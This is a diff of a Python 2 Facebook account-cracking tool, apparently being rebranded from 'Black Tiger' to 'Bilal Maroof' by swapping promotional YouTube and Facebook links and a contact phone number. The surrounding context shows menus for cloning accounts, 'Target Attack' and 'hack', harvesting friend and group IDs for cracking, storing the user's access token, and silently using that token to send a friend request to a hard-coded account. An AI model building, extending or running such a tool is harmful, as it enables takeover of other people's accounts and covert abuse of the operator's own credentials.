@@ -133,10 +133,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 
 def login():
 	os.system('clear')
@@ -158,7 +158,7 @@ def login():
 		pwd = raw_input('\033[1;97m[●] \x1b[1;96mPassword\x1b[1;97m      : \x1b[1;93m')
 		tik()
 		try:
-			br.open('https://m.facebook.com')
+			br.open('https://www.facebook.com')
 		except mechanize.URLError:
 			print"\n\x1b[1;97mThere is no internet connection"
 			keluar()
@@ -183,7 +183,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;91mLogin Successful.•◄►•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -239,7 +239,7 @@ def menu():
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
-        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Tiger   Massage "
+        print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m9.\x1b[1;91m Bilal Maroof   Massage "
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m10.\033[1;93mShow  Token"
         print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m11.\033[1;91mAfter Cloning Data Reset "
 	print "\033[1;91m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91m logout "
@@ -341,9 +341,9 @@ def crack():
 	os.system('clear')
 	print logo
 	print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Tiger Facebook Group Pakistan."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Tiger Group Cloning."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mBlack Tiger Youtube Chenal."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mBilal Maroof Facebook Group Pakistan."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;95mBilal Maroof Group Cloning."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mBilal Maroof Youtube Chenal."
 	print "\033[1;93m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
 
@@ -371,7 +371,7 @@ def pilih_crack():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com%2Fskytech.fb&redir_token')
 	        menu()
         elif peak =="3":
                 os.system('clear')
@@ -392,7 +392,7 @@ def pilih_crack():
 		for p in s['data']:
 			id.append(p['id'])
         elif peak =="4":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -672,8 +672,8 @@ def hack():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;96mBlack Tiger Facebook Group Indonasia."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;96mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;96mBilal Maroof Facebook Group Indonasia."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;96mBilal Maroof Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_hack()
 
@@ -701,10 +701,10 @@ def pilih_hack():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com%2Fskytech.fb&redir_token')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -976,8 +976,8 @@ def black():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;97mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;97mBlack Tiger Facebook Group USA."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;97mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;97mBilal Maroof Facebook Group USA."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;97mBilal Maroof Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_black()
 
@@ -1005,10 +1005,10 @@ def pilih_black():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com%2Fskytech.fb&redir_token')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1282,8 +1282,8 @@ def Tiger():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;95mBlack Tiger Facebook Group Bangladash."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;95mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;95mBilal Maroof Facebook Group Bangladash."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;95mBilal Maroof Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_Tiger()
 
@@ -1311,10 +1311,10 @@ def pilih_Tiger():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com%2Fskytech.fb&redir_token')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1571,7 +1571,7 @@ _________$$$$$__$$$$$___$$$$$__$$$$$____
 : \033[1;94m .....🅑🅘🅛🅐🅛ₘᵣ_ᵦᵢₗₗᵢ  🅢🅚🅨🅣🅔🅒🅗....... \033[1;97m :
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;94m +923094161457"""
+              \033[1;94m +923402923983"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -1589,8 +1589,8 @@ def test():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Tiger Facebook Group."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92mBilal Maroof Facebook Group."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;92mBilal Maroof Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_test()
 
@@ -1618,10 +1618,10 @@ def pilih_test():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com%2Fskytech.fb&redir_token')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1870,7 +1870,7 @@ def pilih_test():
 : \033[1;94m .....🅑🅘🅛🅐🅛ₘᵣ_ᵦᵢₗₗᵢ  🅢🅚🅨🅣🅔🅒🅗....... \033[1;97m :
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;94m +923094161457"""
+              \033[1;94m +923402923983"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -1888,8 +1888,8 @@ def super():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;93mBlack Tiger Facebook Group India."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;93mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;93mBilal Maroof Facebook Group India."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;93mBilal Maroof Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_super()
 
@@ -1917,10 +1917,10 @@ def pilih_super():
 		for i in z['data']:
 			id.append(i['id'])
         elif peak =="2":
-	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
+	        os.system('xdg-open https://www.facebook.com%2Fskytech.fb&redir_token')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://www.youtube.com/channel/UCQCqVzrHbvFSFnKAu6bIQwg')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -2179,7 +2179,7 @@ def pilih_super():
 : \033[1;94m .....🅑🅘🅛🅐🅛ₘᵣ_ᵦᵢₗₗᵢ  🅢🅚🅨🅣🅔🅒🅗....... \033[1;97m :
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;94m +923094161457"""
+              \033[1;94m +923402923983"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
